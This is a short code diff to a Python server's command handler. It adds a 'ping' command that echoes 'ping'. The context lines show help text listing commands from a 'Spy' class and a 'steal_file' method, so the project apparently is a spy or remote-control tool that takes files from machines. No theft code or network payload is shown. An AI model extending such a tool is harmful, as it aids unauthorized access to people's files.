@@ -56,6 +56,8 @@ class Server:
                 return get_commands(Spy) + parse_methods([(self.steal_file, "steal_file")]) + f"\n put {Massages.DEFAULT_PARAM} for default param"
             case "?":
                 return get_commands(Spy) + parse_methods([(self.steal_file, "steal_file")]) + f"\n put {Massages.DEFAULT_PARAM} for default param"
+            case "ping":
+                return "ping"
 
 
         # if command in SPY_COMMANDS:
